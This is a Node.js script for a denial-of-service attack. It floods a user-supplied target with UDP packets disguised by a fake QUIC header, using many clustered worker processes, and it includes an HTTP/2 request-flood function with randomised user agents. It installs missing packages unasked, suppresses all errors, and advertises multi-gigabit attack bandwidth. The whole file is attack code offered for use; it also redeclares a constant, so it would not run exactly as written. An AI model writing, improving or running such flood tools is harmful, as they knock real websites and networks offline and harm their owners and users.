const requiredModules = [
  "colors", "dgram", "dns", "cluster", "url", "crypto", 
  "user-agents", "random-useragent", "net"
];

// Install missing modules
requiredModules.forEach(moduleName => {
  try {
    require.resolve(moduleName);
  } catch (error) {
    console.log("Installing the module " + moduleName + "...");
    const { execSync } = require("child_process");
    try {
      execSync("npm install " + moduleName, { stdio: 'inherit' });
    } catch (installError) {
      console.log("Failed to install " + moduleName);
    }
  }
});

const dgram = require('dgram');
const dns = require('dns');
const cluster = require('cluster');
const crypto = require('crypto');
const colors = require('colors');
const randomUseragent = require('random-useragent');
const net = require('net');

// Process arguments
if (process.argv.length < 6) {
  console.log("Usage: node script.js <url> <time> <rate> <threads> <method>");
  console.log("Example: node k.js https://example.com 60 100000 4 3");
  process.exit();
}

const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
  rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  method: ~~process.argv[6]
};

const parsedTarget = new URL(args.target);
const targetHost = parsedTarget.hostname;
const targetPort = parsedTarget.port || 443;

console.log(`🎯 Target: ${args.target}`.bgBlue);
console.log(`⏰ Time: ${args.time}s | 📊 Rate: ${args.rate}/s | 🧵 Threads: ${args.threads}`.yellow);

// UDP Flood Configuration
const UDP_CONFIG = {
  PACKET_SIZE: 1400, // Optimal UDP packet size
  BATCH_SIZE: 50,    // Packets per batch
  SOCKET_BUFFER: 64 * 1024 * 1024 // 64MB buffer
};

let targetIP = targetHost;

// Resolve DNS
const dns = require('dns');
dns.lookup(targetHost, (err, address) => {
  if (!err) {
    targetIP = address;
    console.log(`🔍 Resolved: ${targetHost} → ${targetIP}`.green);
  }
});

// Generate optimized UDP payload
function generatePayload() {
  const payload = Buffer.alloc(UDP_CONFIG.PACKET_SIZE);
  
  // Add some structure to look like QUIC/HTTP3
  payload.writeUInt8(0xC0, 0); // Fake QUIC header
  payload.writeUInt32BE(Date.now(), 1); // Timestamp
  payload.writeUInt32BE(Math.floor(Math.random() * 0xFFFFFFFF), 5); // Random ID
  
  // Fill with random data
  crypto.randomFillSync(payload, 9);
  
  return payload;
}

// High-performance UDP flood
function udpFlood() {
  const socket = dgram.createSocket('udp4');
  
  // Maximize socket performance
  try {
    socket.setSendBufferSize(UDP_CONFIG.SOCKET_BUFFER);
    socket.setRecvBufferSize(UDP_CONFIG.SOCKET_BUFFER);
  } catch (e) {
    // Ignore buffer size errors
  }
  
  const payload = generatePayload();
  let packetsSent = 0;
  let startTime = Date.now();
  
  socket.on('error', () => {
    // Ignore UDP errors
  });
  
  // Calculate packets per interval
  const packetsPerInterval = Math.max(1, Math.floor(args.rate / 100));
  
  const sendBatch = () => {
    for (let i = 0; i < packetsPerInterval; i++) {
      // Modify packet slightly each time
      payload.writeUInt32BE(Math.floor(Math.random() * 0xFFFFFFFF), 5);
      crypto.randomFillSync(payload, 9);
      
      socket.send(payload, targetPort, targetIP, (err) => {
        if (!err) packetsSent++;
      });
    }
  };
  
  // High frequency flooding
  const floodInterval = setInterval(sendBatch, 1);
  
  // Stats logging
  const statsInterval = setInterval(() => {
    const elapsed = (Date.now() - startTime) / 1000;
    const rate = packetsSent / elapsed;
    const mbps = (packetsSent * UDP_CONFIG.PACKET_SIZE * 8) / (elapsed * 1024 * 1024);
    
    console.log(`📊 ${packetsSent.toLocaleString()} packets | ${rate.toLocaleString()} pps | ${mbps.toFixed(2)} Mbps`.cyan);
    
    packetsSent = 0;
    startTime = Date.now();
  }, 2000);
  
  // Cleanup
  setTimeout(() => {
    clearInterval(floodInterval);
    clearInterval(statsInterval);
    socket.close();
    process.exit(0);
  }, args.time * 1000);
}

// HTTP/2 Flood (fallback)
function http2Flood() {
  console.log("🚀 Starting HTTP/2 Flood".bgRed);
  
  let requestsSent = 0;
  let startTime = Date.now();
  
  const makeRequest = () => {
    try {
      const socket = net.connect({
        host: targetIP,
        port: targetPort,
        family: 4
      });
      
      socket.setTimeout(5000);
      
      socket.on('connect', () => {
        // Create TLS connection for HTTPS
        const tls = require('tls');
        const tlsSocket = tls.connect({
          socket: socket,
          host: targetHost,
          servername: targetHost,
          rejectUnauthorized: false,
          ALPNProtocols: ['h2', 'http/1.1']
        });
        
        tlsSocket.on('secureConnect', () => {
          const http2 = require('http2');
          const client = http2.connect(`https://${targetHost}`, {
            createConnection: () => tlsSocket
          });
          
          client.on('connect', () => {
            for (let i = 0; i < 10; i++) {
              try {
                const req = client.request({
                  ':method': 'GET',
                  ':path': parsedTarget.pathname || '/',
                  ':authority': targetHost,
                  ':scheme': 'https',
                  'user-agent': randomUseragent.getRandom(),
                  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                });
                
                req.on('response', () => {});
                req.end();
                requestsSent++;
              } catch (e) {
                // Ignore request errors
              }
            }
          });
          
          setTimeout(() => {
            client.destroy();
          }, 3000);
        });
        
        tlsSocket.on('error', () => {
          socket.destroy();
        });
      });
      
      socket.on('error', () => {
        // Ignore connection errors
      });
      
    } catch (error) {
      // Ignore errors
    }
  };
  
  const floodInterval = setInterval(() => {
    for (let i = 0; i < Math.max(1, args.rate / 100); i++) {
      makeRequest();
    }
  }, 10);
  
  // Stats
  const statsInterval = setInterval(() => {
    const elapsed = (Date.now() - startTime) / 1000;
    const rate = requestsSent / elapsed;
    console.log(`🔥 ${requestsSent.toLocaleString()} HTTP/2 requests | ${rate.toLocaleString()} req/s`.green);
    requestsSent = 0;
    startTime = Date.now();
  }, 2000);
  
  setTimeout(() => {
    clearInterval(floodInterval);
    clearInterval(statsInterval);
    process.exit(0);
  }, args.time * 1000);
}

// Cluster setup
if (cluster.isPrimary) {
  console.log("🚀 Starting UDP Flood Attack".bgRed);
  console.log("💡 Using pure UDP for maximum bandwidth (10-50+ Gbps possible)".yellow);
  
  for (let i = 0; i < args.threads; i++) {
    cluster.fork();
  }
  
  cluster.on('exit', (worker) => {
    console.log(`Thread ${worker.id} finished`);
  });
} else {
  console.log(`🧵 Thread ${cluster.worker.id} starting UDP flood`.cyan);
  
  // Use UDP flood for maximum performance
  udpFlood();
}

// Error handlers
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

console.log("⚡ Pure UDP Flood Running - Expecting 10-50+ Gbps bandwidth".rainbow);
